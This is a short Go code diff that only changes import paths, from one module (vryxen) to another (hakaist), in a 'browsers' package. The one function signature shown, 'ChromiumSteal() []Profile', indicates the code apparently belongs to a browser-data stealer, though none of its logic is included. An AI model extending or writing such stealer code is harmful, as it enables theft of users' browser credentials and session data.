@@ -2,12 +2,13 @@ package browsers
 
 import (
 	"fmt"
-	"github.com/unf6/vryxen/pkg/utils/fileutil"
-	"github.com/unf6/vryxen/pkg/utils/common"
-	"github.com/unf6/vryxen/pkg/utils/requests"
 	"os"
 	"path/filepath"
 	"strings"
+
+	"github.com/lukyydnv/hakaist/pkg/utils/common"
+	"github.com/lukyydnv/hakaist/pkg/utils/fileutil"
+	"github.com/lukyydnv/hakaist/pkg/utils/requests"
 )
 
 func ChromiumSteal() []Profile {
